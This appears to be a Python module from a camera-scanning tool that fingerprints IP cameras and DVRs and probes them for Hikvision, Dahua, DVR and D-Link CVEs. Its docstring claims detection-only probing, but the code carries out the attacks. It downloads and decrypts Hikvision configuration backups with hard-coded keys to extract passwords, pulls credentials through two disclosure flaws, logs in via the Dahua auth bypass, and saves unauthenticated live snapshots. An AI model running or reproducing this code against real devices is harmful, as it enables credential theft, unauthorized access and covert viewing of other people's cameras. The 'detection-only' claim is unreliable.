"""HTTP enrichment, fingerprinting, and vulnerability probing for camera hits.

All probes are detection-only. No config changes, no command execution.

CVE coverage:
  CVE-2017-7921   — Hikvision auth bypass + config download/decrypt
  CVE-2021-36260  — Hikvision command injection (detection only)
  CVE-2021-33044  — Dahua authentication bypass via NetKeyboard client type
  CVE-2018-9995   — Generic DVR credential disclosure (/device.rsp)
  CVE-2020-25078  — D-Link DCS credential disclosure (/config/getuser)
"""
from __future__ import annotations

import asyncio
import hashlib
import json
import logging
import re
from dataclasses import dataclass, field
from itertools import cycle

log = logging.getLogger("camscan.vulns")

# ── Vuln catalogue ─────────────────────────────────────────────────────────────
VULN_DEFS: dict[str, tuple[str, str]] = {
    "unauth_rtsp_access":        ("critical", "RTSP stream open with no credentials"),
    "weak_default_creds":        ("high",     "RTSP stream uses factory-default credentials"),
    "hikvision_cve_2017_7921":   ("critical", "CVE-2017-7921: Hikvision auth bypass via static token"),
    "hikvision_cve_2021_36260":  ("critical", "CVE-2021-36260: Hikvision command injection endpoint reachable"),
    "hikvision_cred_extracted":  ("critical", "Credentials decrypted from Hikvision config backup"),
    "dahua_cve_2021_33044":      ("critical", "CVE-2021-33044: Dahua auth bypass via NetKeyboard client type"),
    "dvr_cve_2018_9995":         ("critical", "CVE-2018-9995: DVR credential disclosure via /device.rsp"),
    "dlink_cve_2020_25078":      ("critical", "CVE-2020-25078: D-Link DCS credential disclosure"),
    "unauth_http_snapshot":      ("high",     "Live snapshot accessible without authentication"),
    "unauth_device_info":        ("medium",   "Device info endpoint exposed without authentication"),
    "dahua_unauth_info":         ("high",     "Dahua system info exposed without authentication"),
    "credential_disclosure":     ("high",     "Credentials returned in plain-text HTTP response"),
    "open_http_interface":       ("info",     "HTTP management interface accessible"),
}

# ── Favicon MD5 → brand (from Ingram/CamTRON research) ────────────────────────
_FAVICON_MD5: dict[str, str] = {
    "89b932fcc47cf4ca3faadb0cfdef89cf": "hikvision",
    "bd9e17c46bbbc18af2a2bd718dddad0e": "dahua",
    "605f51b413980667766a9aff2e53b9ed": "dahua",
    "b39f249362a2e4ab62be4ddbc9125f53": "dahua",
    "4ff53be6165e430af41d782e00207fda": "dahua",
    "f066b751b858f75ef46536f5b357972b": "dvr",
    "1536f25632f78fb03babedcb156d3f69": "uniview",
    "6a7e13b3f9197a383c96618fe32e345a": "avtech",
    "a3fd8705f010b90e37d42128000f620b": "axis",
    "fa31b29eab2da688b11d8fafc5fc6b27": "tenda",
}

# ── Server header / body fingerprint patterns ──────────────────────────────────
_FINGERPRINTS: list[tuple[str, list[str]]] = [
    ("hikvision", ["hikvision", "dvr login", "network camera", "cgi-bin/main.cgi",
                   "app-webs", "dnvrs-webs", "dvrdvs-webs", "hikvision-webs"]),
    ("dahua",     ["dahua", "dh-ipc", "configmanager", "rpc2_login", "web service"]),
    ("axis",      ["axis", "vapix", "axis camera"]),
    ("foscam",    ["foscam", "ipcam_", "ipnc"]),
    ("samsung",   ["samsung", "hanwha", "wisenet", "snv-"]),
    ("bosch",     ["bosch", "autodome", "flexidome"]),
    ("sony",      ["sony", "snc-", "ipela"]),
    ("ubiquiti",  ["ubiquiti", "ubnt", "unifi"]),
    ("reolink",   ["reolink"]),
    ("tp-link",   ["tp-link", "tapo"]),
    ("dlink",     ["dcs-", "realm=\"dcs"]),
    ("dvr",       ["login.rsp", "/device.rsp"]),
    ("generic",   ["ipcam", "netcam", "webcam", "dvr", "nvr", "goahead", "boa/"]),
]

HTTP_PORTS = (80, 8080, 81, 8081, 8088)

# Hikvision CVE-2017-7921 — static auth token (base64 of "admin:1\n")
_HIK_AUTH_TOKEN = "YWRtaW46MTEK"

_SNAPSHOT_PATHS: list[tuple[str, str]] = [
    ("hikvision", "/ISAPI/Streaming/channels/101/picture"),
    ("hikvision", "/Streaming/channels/1/picture"),
    ("hikvision", f"/onvif-http/snapshot?auth={_HIK_AUTH_TOKEN}"),
    ("dahua",     "/cgi-bin/snapshot.cgi"),
    ("dahua",     "/cgi-bin/mjpg/video.cgi?channel=0&subtype=0"),
    ("axis",      "/axis-cgi/jpg/image.cgi"),
    ("foscam",    "/cgi-bin/CGIProxy.fcgi?cmd=snapPicture2&usr=&pwd="),
    ("samsung",   "/cgi-bin/video.jpg"),
    ("",          "/snapshot.jpg"),
    ("",          "/snapshot.cgi"),
    ("",          "/image.jpg"),
    ("",          "/tmpfs/auto.jpg"),
    ("",          "/jpg/image.jpg"),
    ("",          "/video.mjpg"),
    ("",          "/cgi-bin/video.jpg"),
    ("",          "/mjpg/video.mjpg"),
]

_INFO_PATHS: list[tuple[str, str, str]] = [
    ("hikvision", "/ISAPI/System/deviceInfo",                        "unauth_device_info"),
    ("hikvision", f"/Security/users?auth={_HIK_AUTH_TOKEN}",         "hikvision_cve_2017_7921"),
    ("hikvision", "/cgi-bin/param.cgi?cmd=getuser",                  "credential_disclosure"),
    ("dahua",     "/cgi-bin/magicBox.cgi?action=getSystemInfo",      "dahua_unauth_info"),
    ("dahua",     "/RPC2",                                            "dahua_unauth_info"),
    ("",          "/deviceConfig.xml",                                "unauth_device_info"),
    ("",          "/system.ini",                                      "unauth_device_info"),
    ("",          "/cgi-bin/status.cgi",                              "unauth_device_info"),
]


@dataclass
class EnrichResult:
    fingerprint: str = ""
    http_port: int = 0
    new_vulns: list[str] = field(default_factory=list)
    http_snapshot_url: str = ""
    http_snapshot_bytes: bytes = field(default_factory=bytes)
    info_disclosures: list[str] = field(default_factory=list)
    extracted_creds: list[str] = field(default_factory=list)   # from CVE-2017-7921 config
    cve_notes: list[str] = field(default_factory=list)          # human-readable findings


# ── Minimal async HTTP helpers ─────────────────────────────────────────────────

async def _raw_request(ip: str, port: int, raw: bytes,
                       timeout: float) -> tuple[int, dict[str, str], bytes]:
    """Send a pre-built HTTP request, return (status, headers, body[:8192])."""
    reader, writer = await asyncio.wait_for(
        asyncio.open_connection(ip, port), timeout=timeout)
    try:
        writer.write(raw)
        await writer.drain()
        data = await asyncio.wait_for(reader.read(16384), timeout=timeout)
    finally:
        writer.close()
        try:
            await writer.wait_closed()
        except Exception:
            pass

    if b"\r\n" not in data:
        raise ValueError("no status line")
    status_line, _, rest = data.partition(b"\r\n")
    parts = status_line.split(None, 2)
    status = int(parts[1]) if len(parts) >= 2 else 0
    headers: dict[str, str] = {}
    if b"\r\n\r\n" in rest:
        hdr_block, _, body = rest.partition(b"\r\n\r\n")
    else:
        hdr_block, body = rest, b""
    for line in hdr_block.decode("latin-1", errors="replace").splitlines():
        if ":" in line:
            k, _, v = line.partition(":")
            headers[k.strip().lower()] = v.strip()
    return status, headers, body[:8192]


async def _http_get(ip: str, port: int, path: str,
                    timeout: float = 3.0) -> tuple[int, dict[str, str], bytes]:
    req = (
        f"GET {path} HTTP/1.0\r\n"
        f"Host: {ip}\r\n"
        f"User-Agent: Mozilla/5.0\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()
    return await _raw_request(ip, port, req, timeout)


async def _http_put(ip: str, port: int, path: str, body: bytes,
                    content_type: str, timeout: float = 3.0) -> tuple[int, dict[str, str], bytes]:
    req = (
        f"PUT {path} HTTP/1.0\r\n"
        f"Host: {ip}\r\n"
        f"Content-Type: {content_type}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"User-Agent: Mozilla/5.0\r\n"
        f"X-Requested-With: XMLHttpRequest\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + body
    return await _raw_request(ip, port, req, timeout)


def _is_jpeg(data: bytes) -> bool:
    return data[:3] == b"\xff\xd8\xff"


def _fingerprint_from(server: str, body_sample: str,
                      favicon_md5: str = "") -> str:
    if favicon_md5 and favicon_md5 in _FAVICON_MD5:
        return _FAVICON_MD5[favicon_md5]
    combined = (server + " " + body_sample[:512]).lower()
    for brand, patterns in _FINGERPRINTS:
        if any(p in combined for p in patterns):
            return brand
    return ""


async def _get_favicon_md5(ip: str, port: int, timeout: float) -> str:
    try:
        status, _, body = await _http_get(ip, port, "/favicon.ico", timeout)
        if status == 200 and body:
            return hashlib.md5(body).hexdigest()
    except Exception:
        pass
    return ""


# ── CVE-2017-7921: Hikvision improper authentication ──────────────────────────

def _decrypt_hik_config(data: bytes) -> list[str]:
    """Decrypt Hikvision config backup. Returns list of 'user:pass' strings.

    Algorithm: AES-ECB decrypt (static key) then XOR with static 4-byte key.
    Source: CVE-2017-7921 public PoC.
    """
    try:
        from Crypto.Cipher import AES  # pycryptodome
        key = bytes.fromhex("279977f62f6cfd2d91cd75b889ce0c9a")
        # Pad to AES block size
        pad = (16 - len(data) % 16) % 16
        padded = data + b"\x00" * pad
        cipher = AES.new(key, AES.MODE_ECB)
        decrypted = cipher.decrypt(padded)
        # XOR pass
        xor_key = bytearray([0x73, 0x8B, 0x55, 0x44])
        result = bytes(a ^ b for a, b in zip(decrypted, cycle(xor_key)))
        text = result.decode("latin-1", errors="replace")
        users = re.findall(r"<userName>(.*?)</userName>", text)
        passwords = re.findall(r"<password>(.*?)</password>", text)
        creds = []
        for u, p in zip(users, passwords):
            if u and "\x00" not in u:
                creds.append(f"{u}:{p}")
        return creds
    except ImportError:
        log.debug("pycryptodome not installed — skipping config decrypt")
    except Exception as e:
        log.debug("hik config decrypt failed: %s", e)
    return []


async def _check_cve_2017_7921(ip: str, port: int,
                                timeout: float) -> tuple[bool, list[str], str, bytes]:
    """Test CVE-2017-7921 auth bypass. Returns (vulnerable, extracted_creds, snapshot_url, snapshot_bytes)."""
    vuln = False
    creds: list[str] = []
    snap_url = ""
    snap_bytes = b""

    # 1. User list endpoint — confirms bypass without downloading config
    try:
        status, _, body = await _http_get(
            ip, port, f"/Security/users?auth={_HIK_AUTH_TOKEN}", timeout)
        if status == 200 and (b"<userName>" in body or b"<userList>" in body):
            vuln = True
            log.warning("CVE-2017-7921 confirmed on %s:%d (user list accessible)", ip, port)
    except Exception:
        pass

    # 2. Unauth snapshot via auth bypass token
    try:
        status, hdrs, body = await _http_get(
            ip, port, f"/onvif-http/snapshot?auth={_HIK_AUTH_TOKEN}", timeout)
        if status == 200 and _is_jpeg(body):
            vuln = True
            snap_url = f"http://{ip}:{port}/onvif-http/snapshot?auth={_HIK_AUTH_TOKEN}"
            snap_bytes = body
            log.warning("CVE-2017-7921 unauth snapshot on %s:%d", ip, port)
    except Exception:
        pass

    # 3. Config file download + credential extraction
    try:
        status, _, body = await _http_get(
            ip, port, f"/System/configurationFile?auth={_HIK_AUTH_TOKEN}", timeout)
        if status == 200 and len(body) > 32:
            vuln = True
            extracted = _decrypt_hik_config(body)
            if extracted:
                creds = extracted
                log.warning("CVE-2017-7921 creds extracted from %s:%d: %s",
                             ip, port, ", ".join(creds[:3]))
    except Exception:
        pass

    return vuln, creds, snap_url, snap_bytes


# ── CVE-2021-36260: Hikvision command injection detection ─────────────────────

async def _check_cve_2021_36260(ip: str, port: int, timeout: float) -> bool:
    """Detect CVE-2021-36260 without executing commands.

    The vulnerable endpoint accepts PUT requests with XML containing shell
    metacharacters. Detection method: send a benign PUT and check if the
    endpoint responds with 200 (patched devices return 401/403/404).
    We do NOT execute any commands or read back any output.
    """
    xml = b'<?xml version="1.0" encoding="UTF-8"?><language>English</language>'
    try:
        status, hdrs, body = await _http_put(
            ip, port, "/SDK/webLanguage", xml,
            "application/x-www-form-urlencoded; charset=UTF-8", timeout)
        # Vulnerable firmware returns 200 to this PUT.
        # Patched firmware returns 401 Unauthorized or 404.
        if status == 200:
            log.warning("CVE-2021-36260 endpoint responsive on %s:%d (status 200 to PUT /SDK/webLanguage)",
                        ip, port)
            return True
    except Exception:
        pass
    return False


# ── CVE-2021-33044: Dahua authentication bypass ───────────────────────────────

async def _check_dahua_cve_2021_33044(ip: str, port: int,
                                       timeout: float) -> tuple[bool, str, str]:
    """CVE-2021-33044: Dahua bypasses auth with clientType=NetKeyboard.
    Returns (vulnerable, note, extracted_creds_str).
    Detection only — we confirm the bypass succeeds but don't enumerate further.
    """
    body = json.dumps({
        "method": "global.login",
        "params": {
            "userName": "admin",
            "password": "Not Used",
            "clientType": "NetKeyboard",
            "loginType": "Direct",
            "authorityType": "Default",
            "passwordType": "Default",
        },
        "id": 1,
        "session": 0,
    }).encode()
    try:
        status, hdrs, resp_body = await _http_put(
            ip, port, "/RPC2_Login", body,
            "application/x-www-form-urlencoded; charset=UTF-8", timeout)
        # Also try as POST (some firmware)
        if status not in (200, 201):
            req = (
                f"POST /RPC2_Login HTTP/1.0\r\n"
                f"Host: {ip}\r\n"
                f"Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n"
                f"Content-Length: {len(body)}\r\n"
                f"User-Agent: Mozilla/5.0\r\n"
                f"Connection: close\r\n\r\n"
            ).encode() + body
            status, hdrs, resp_body = await _raw_request(ip, port, req, timeout)

        if status == 200:
            try:
                data = json.loads(resp_body.decode("utf-8", errors="replace"))
                if data.get("result") is True:
                    note = (f"CVE-2021-33044: Dahua auth bypass confirmed on "
                            f"http://{ip}:{port}/RPC2_Login (NetKeyboard bypass)")
                    log.warning(note)
                    return True, note, ""
            except Exception:
                pass
    except Exception:
        pass
    return False, "", ""


# ── CVE-2018-9995: Generic DVR credential disclosure ─────────────────────────

async def _check_dvr_cve_2018_9995(ip: str, port: int,
                                    timeout: float) -> tuple[bool, str, str]:
    """CVE-2018-9995: Many cheap DVR/NVR brands expose all credentials at
    /device.rsp?opt=user&cmd=list with a simple Cookie: uid=admin header.
    Returns (vulnerable, note, 'user:pass').
    """
    req = (
        f"GET /device.rsp?opt=user&cmd=list HTTP/1.0\r\n"
        f"Host: {ip}\r\n"
        f"Cookie: uid=admin\r\n"
        f"User-Agent: Mozilla/5.0\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()
    try:
        status, hdrs, body = await _raw_request(ip, port, req, timeout)
        if status == 200 and body:
            try:
                data = json.loads(body.decode("utf-8", errors="replace"))
                entry = data.get("list", [{}])[0]
                user = entry.get("uid", "")
                passwd = entry.get("pwd", "")
                if user:
                    cred = f"{user}:{passwd}"
                    note = (f"CVE-2018-9995: DVR credential disclosed at "
                            f"http://{ip}:{port}/device.rsp — {cred}")
                    log.warning(note)
                    return True, note, cred
            except Exception:
                pass
    except Exception:
        pass
    return False, "", ""


# ── CVE-2020-25078: D-Link DCS credential disclosure ─────────────────────────

async def _check_dlink_cve_2020_25078(ip: str, port: int,
                                       timeout: float) -> tuple[bool, str, str]:
    """CVE-2020-25078: D-Link DCS cameras expose admin credentials at
    /config/getuser?index=0 without authentication.
    Returns (vulnerable, note, 'user:pass').
    """
    try:
        status, _, body = await _http_get(
            ip, port, "/config/getuser?index=0", timeout)
        if status == 200 and body:
            text = body.decode("utf-8", errors="replace")
            if "name=" in text and "pass=" in text and "<html" not in text.lower():
                parts = text.split()
                user, passwd = "", ""
                for p in parts:
                    if p.startswith("name="):
                        user = p.split("=", 1)[1]
                    elif p.startswith("pass="):
                        passwd = p.split("=", 1)[1]
                if user:
                    cred = f"{user}:{passwd}"
                    note = (f"CVE-2020-25078: D-Link DCS credential disclosed at "
                            f"http://{ip}:{port}/config/getuser — {cred}")
                    log.warning(note)
                    return True, note, cred
    except Exception:
        pass
    return False, "", ""


# ── Main enrichment entry point ────────────────────────────────────────────────

async def enrich(ip: str, existing_fingerprint: str = "",
                 timeout: float = 3.0) -> EnrichResult:
    """Probe HTTP interface, fingerprint brand, run CVE checks and unauth tests."""
    r = EnrichResult(fingerprint=existing_fingerprint)

    # ── 1. Fingerprint via HTTP + favicon MD5 ─────────────────────────────────
    for port in HTTP_PORTS:
        try:
            status, hdrs, body = await _http_get(ip, port, "/", timeout)
            if status > 0:
                r.http_port = port
                server_hdr = hdrs.get("server", "")
                body_sample = body.decode("latin-1", errors="replace")
                fav_md5 = await _get_favicon_md5(ip, port, timeout)
                if not r.fingerprint:
                    r.fingerprint = _fingerprint_from(server_hdr, body_sample, fav_md5)
                if status < 500:
                    r.new_vulns.append("open_http_interface")
                log.info("http %s:%d  status=%d  server=%r  favicon=%s  brand=%s",
                         ip, port, status, server_hdr[:40],
                         fav_md5[:8] if fav_md5 else "—", r.fingerprint or "?")
                break
        except Exception:
            continue

    if not r.http_port:
        return r  # No HTTP found

    # ── 2. Hikvision-specific CVE checks ──────────────────────────────────────
    is_hik = r.fingerprint == "hikvision"

    # CVE-2017-7921 — try on Hikvision or unidentified hosts (the auth bypass
    # path returns 401/404 immediately on non-Hik devices, cheap to test)
    try:
        vuln_7921, creds, snap_url, snap_bytes = await _check_cve_2017_7921(
            ip, r.http_port, timeout)
        if vuln_7921:
            r.fingerprint = r.fingerprint or "hikvision"
            r.new_vulns.append("hikvision_cve_2017_7921")
            r.cve_notes.append(
                f"CVE-2017-7921: auth bypass confirmed on http://{ip}:{r.http_port}")
            if creds:
                r.new_vulns.append("hikvision_cred_extracted")
                r.extracted_creds = creds
                r.cve_notes.append(
                    f"Extracted credentials: {', '.join(creds[:5])}")
            if snap_url and not r.http_snapshot_url:
                r.http_snapshot_url = snap_url
                r.http_snapshot_bytes = snap_bytes
                if "unauth_http_snapshot" not in r.new_vulns:
                    r.new_vulns.append("unauth_http_snapshot")
    except Exception as e:
        log.debug("cve-2017-7921 check error %s: %s", ip, e)

    # CVE-2021-36260 — only run against confirmed/suspected Hikvision
    if r.fingerprint == "hikvision" or is_hik:
        try:
            if await _check_cve_2021_36260(ip, r.http_port, timeout):
                r.new_vulns.append("hikvision_cve_2021_36260")
                r.cve_notes.append(
                    f"CVE-2021-36260: PUT /SDK/webLanguage returned 200 on "
                    f"http://{ip}:{r.http_port} — command injection likely present")
        except Exception as e:
            log.debug("cve-2021-36260 check error %s: %s", ip, e)

    # ── 3. Dahua CVE-2021-33044 ───────────────────────────────────────────────
    if r.fingerprint in ("dahua", "") :
        try:
            vuln, note, cred = await _check_dahua_cve_2021_33044(
                ip, r.http_port, timeout)
            if vuln:
                r.fingerprint = r.fingerprint or "dahua"
                r.new_vulns.append("dahua_cve_2021_33044")
                r.cve_notes.append(note)
                if cred:
                    r.extracted_creds.append(cred)
        except Exception as e:
            log.debug("cve-2021-33044 error %s: %s", ip, e)

    # ── 4. DVR CVE-2018-9995 ─────────────────────────────────────────────────
    try:
        vuln, note, cred = await _check_dvr_cve_2018_9995(
            ip, r.http_port, timeout)
        if vuln:
            r.fingerprint = r.fingerprint or "dvr"
            r.new_vulns.append("dvr_cve_2018_9995")
            r.cve_notes.append(note)
            if cred:
                r.extracted_creds.append(cred)
    except Exception as e:
        log.debug("cve-2018-9995 error %s: %s", ip, e)

    # ── 5. D-Link CVE-2020-25078 ─────────────────────────────────────────────
    if r.fingerprint in ("dlink", ""):
        try:
            vuln, note, cred = await _check_dlink_cve_2020_25078(
                ip, r.http_port, timeout)
            if vuln:
                r.fingerprint = r.fingerprint or "dlink"
                r.new_vulns.append("dlink_cve_2020_25078")
                r.cve_notes.append(note)
                if cred:
                    r.extracted_creds.append(cred)
        except Exception as e:
            log.debug("cve-2020-25078 error %s: %s", ip, e)

    # ── 6. Generic unauth snapshot probes ─────────────────────────────────────
    if not r.http_snapshot_url:
        candidates = [p for brand, p in _SNAPSHOT_PATHS if brand == r.fingerprint]
        candidates += [p for brand, p in _SNAPSHOT_PATHS
                       if brand == "" and p not in candidates]
        for path in candidates:
            try:
                status, hdrs, body = await _http_get(ip, r.http_port, path, timeout)
                ct = hdrs.get("content-type", "")
                if status == 200 and (_is_jpeg(body) or "image" in ct or "video" in ct):
                    r.http_snapshot_url = f"http://{ip}:{r.http_port}{path}"
                    r.http_snapshot_bytes = body
                    if "unauth_http_snapshot" not in r.new_vulns:
                        r.new_vulns.append("unauth_http_snapshot")
                    log.warning("unauth_http_snapshot %s -> %s", ip, r.http_snapshot_url)
                    break
            except Exception:
                continue

    # ── 7. Info / config disclosure ───────────────────────────────────────────
    info_candidates = [(p, vk) for brand, p, vk in _INFO_PATHS
                       if brand == "" or brand == r.fingerprint]
    for path, vuln_key in info_candidates:
        if vuln_key in r.new_vulns:
            continue
        try:
            status, hdrs, body = await _http_get(ip, r.http_port, path, timeout)
            ct = hdrs.get("content-type", "text")
            if status == 200 and body and "image" not in ct:
                r.new_vulns.append(vuln_key)
                r.info_disclosures.append(path)
                log.warning("%s %s -> %s (200, %d bytes)",
                            vuln_key, ip, path, len(body))
        except Exception:
            continue

    return r
